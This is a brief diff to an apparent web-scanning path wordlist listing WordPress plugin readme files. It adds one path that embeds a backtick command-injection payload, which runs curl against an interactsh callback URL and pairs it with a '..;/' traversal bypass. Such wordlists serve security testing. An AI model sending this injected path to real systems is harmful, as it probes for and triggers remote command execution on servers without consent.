@@ -3800,3 +3800,4 @@ pathCache.php
 /wp-content/plugins/spirit-framework/readme.txt
 /wp-content/plugins/wprecovery/readme.txt
 /wp-content/plugins/yournewsapp/readme.txt
+/misc/`curl${IFS}{{interactsh-url}}`/..;/index.html
